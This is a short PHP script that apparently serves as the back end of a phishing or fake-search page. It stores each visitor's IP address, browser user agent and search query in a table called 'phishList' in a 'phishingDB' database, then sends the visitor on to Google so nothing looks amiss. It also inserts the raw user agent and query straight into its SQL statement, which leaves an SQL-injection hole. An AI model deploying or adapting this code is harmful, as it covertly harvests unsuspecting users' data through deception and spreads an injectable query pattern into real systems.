<?php
$server = "localhost";
$username = "php";
$password = "password";
$database = "phishingDB";

$conn = mysqli_connect($server, $username, $password, $database);

$async_query = $_POST['query'] ?? null;

$IP = $_SERVER["REMOTE_ADDR"];
$agent = $_SERVER["HTTP_USER_AGENT"];
$query = $_POST['query'] ?? '';

$sql = "INSERT INTO phishList (IP, agent, `query`)
        VALUES ('$IP', '$agent', '$async_query')";

$result = mysqli_query($conn, $sql);

if (!empty($_SERVER['HTTP_X_REQUESTED_WITH'])) {
    exit;
}

header("Location: https://www.google.com/search?q=" . urlencode($query));
exit;

mysqli_close($conn);
?>